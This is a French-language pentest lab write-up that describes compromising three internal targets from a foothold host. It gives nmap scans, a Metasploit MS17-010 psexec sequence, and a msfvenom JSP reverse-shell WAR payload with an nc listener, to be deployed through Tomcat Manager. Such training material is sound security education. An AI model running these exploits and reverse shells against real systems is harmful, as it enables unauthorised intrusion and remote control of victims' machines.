# Lab - Engagement complet

## Scenario

L'equipe de pentest a obtenu un acces initial au reseau interne d'un client. Trois cibles sont accessibles depuis un poste de rebond (Foothold). L'objectif est de comprometre chaque machine en utilisant les techniques appropriees : exploitation de services, deploiement de web shells, reverse shells.

Toutes les actions doivent etre menees depuis le Foothold, seul poste ayant acces au reseau interne (172.16.0.0/23).

## Approche

1. **Reconnaissance** : scanner chaque cible avec Nmap pour identifier les services et versions.
2. **Identification des vecteurs** : determiner le type d'attaque adapte a chaque cible (exploitation SMB, upload de web shell, injection).
3. **Exploitation** : obtenir un shell interactif sur chaque machine.
4. **Post-exploitation** : recuperer les informations demandees pour valider le challenge.

## Commandes

### Connexion au Foothold

```bash
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'motdepasse'
```

### Scan des cibles

```bash
nmap -sC -sV <IP_CIBLE>
sudo nmap -A -O --script vuln <IP_CIBLE>
```

### Exploitation d'un serveur Windows via SMB

Si la cible est vulnerable a MS17-010 :

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS <IP_CIBLE>
msf6 > set LHOST <IP_FOOTHOLD>
msf6 > exploit
```

### Exploitation d'une application web

Si une application vulnerable avec upload est identifiee :

1. Rechercher un exploit ou un module Metasploit adapte.
2. Configurer les identifiants si necessaires.
3. Exploiter pour obtenir un shell.

### Deploiement d'un web shell via Tomcat

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_FOOTHOLD> LPORT=4444 -f war -o shell.war
nc -lvnp 4444
```

Uploader le .war via le Tomcat Manager, puis naviguer vers l'URL du shell pour declencher la connexion.

## Ce qu'on en retient

- La reconnaissance reste l'etape la plus importante. Sans elle, on choisit les mauvais outils.
- Chaque cible a un vecteur different. Il faut adapter sa methodologie, pas appliquer la meme recette partout.
- Travailler depuis un Foothold ajoute une couche de complexite : les listeners doivent etre configures avec l'IP du Foothold, pas l'IP de la machine d'attaque externe.
- Documenter chaque action, chaque commande, chaque hash de fichier depose. C'est indispensable pour le rapport et pour la tracabilite.

***
